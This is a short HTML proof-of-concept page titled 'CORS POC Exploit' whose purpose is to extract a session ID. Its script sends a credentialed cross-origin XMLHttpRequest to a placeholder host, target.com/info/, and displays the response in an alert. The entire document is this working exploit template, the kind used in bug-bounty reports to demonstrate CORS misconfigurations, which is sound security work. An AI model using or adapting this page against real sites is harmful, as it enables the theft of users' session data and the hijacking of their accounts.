<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
 
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("GET", "https://target.com/info/", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
 
</body>
</html>
